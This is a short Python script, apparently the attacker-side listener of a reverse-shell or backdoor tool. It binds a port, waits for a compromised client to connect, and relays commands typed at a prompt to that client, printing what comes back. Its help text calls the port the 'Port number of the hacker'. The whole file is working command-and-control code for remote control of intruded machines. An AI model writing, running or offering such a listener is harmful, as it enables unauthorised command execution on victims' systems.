import socket
import argparse
from termcolor import cprint
import threading

class Listener:
    CLIENTS = {}

    def __init__(self, port):
        self.sd = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.sd.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        self.sd.bind(('', port))
        self.sd.listen(10)
        #Waiting for requests
        self.client_sd, self.client_address = self.sd.accept()

    def run(self):
        while True:
            command = input(">> ")
            self.client_sd.send(command.encode())

            size = ''
            while True:
                size += self.client_sd.recv(1).decode('utf-8','ignore')

                if size.endswith('\r\n'):
                    break

            result = self.client_sd.recv(int(size)).decode('utf-8','ignore')
            print(result)

'''
Error raised if the user doesn't specify a valid gateway IP address
'''
class NoPortSpecified(Exception):
    pass

'''
Parser of command line arguments
'''
def args_parser():
    #Parser of command line arguments
    parser = argparse.ArgumentParser()
    #Initialization of needed arguments
    parser.add_argument("-port", "-p", dest="port", help="Port number of the hacker")
    #Parse command line arguments
    args = parser.parse_args()
    
    #Check if the arguments have been specified on command line
    try:
        if not args.port:
            raise NoPortSpecified
        
        cprint('Port:  ', 'green', attrs=['bold',], end='')
        print(f'{args.port}', end='\n\n')

    except NoPortSpecified as e :
        parser.print_help()
        exit(0)

    return int(args.port)


if __name__=='__main__':
    port = args_parser()
    server = Listener(port)
    server.run()
